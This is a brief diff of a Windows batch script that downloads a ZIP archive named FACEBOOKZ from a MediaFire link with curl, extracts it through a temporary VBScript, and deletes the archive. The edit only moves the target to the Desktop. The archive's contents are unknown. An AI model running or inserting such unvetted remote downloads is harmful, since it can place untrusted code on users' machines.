@@ -179,9 +179,9 @@ setlocal
 
 mkdir "FACEBOOKZ"
 
-curl https://download1648.mediafire.com/3ay3uiw20m2gn2SIu10OtaAbUSjWPvK_kxLVlu5rVylw0i_Sy_ZPA_abdgAHGGwWoj2TH9UtVffPkGqoHn4XEClHUcVvrMli1Ij5fkCiZcsmqwSqpxlaASB-9hRBr0-cG809w7zfpytVTzs7eyxkkNDxeqmRUs7myH6wfiYLk5Xw/2liqpj21rcvddac/FACEBOOKZ.zip -o "FACEBOOKZ\FACEBOOKZ.zip"
-Call :UnZipFile "FACEBOOKZ\" "FACEBOOKZ\FACEBOOKZ.zip"
-del "FACEBOOKZ\FACEBOOKZ.zip"
+curl https://download1648.mediafire.com/3ay3uiw20m2gn2SIu10OtaAbUSjWPvK_kxLVlu5rVylw0i_Sy_ZPA_abdgAHGGwWoj2TH9UtVffPkGqoHn4XEClHUcVvrMli1Ij5fkCiZcsmqwSqpxlaASB-9hRBr0-cG809w7zfpytVTzs7eyxkkNDxeqmRUs7myH6wfiYLk5Xw/2liqpj21rcvddac/FACEBOOKZ.zip -o "Desktop\FACEBOOKZ\FACEBOOKZ.zip"
+Call :UnZipFile "Desktop\FACEBOOKZ\" "Desktop\FACEBOOKZ\FACEBOOKZ.zip"
+del "Desktop\FACEBOOKZ\FACEBOOKZ.zip"
 
 :UnZipFile <ExtractTo> <newzipfile>
 set vbs="%temp%\_.vbs"
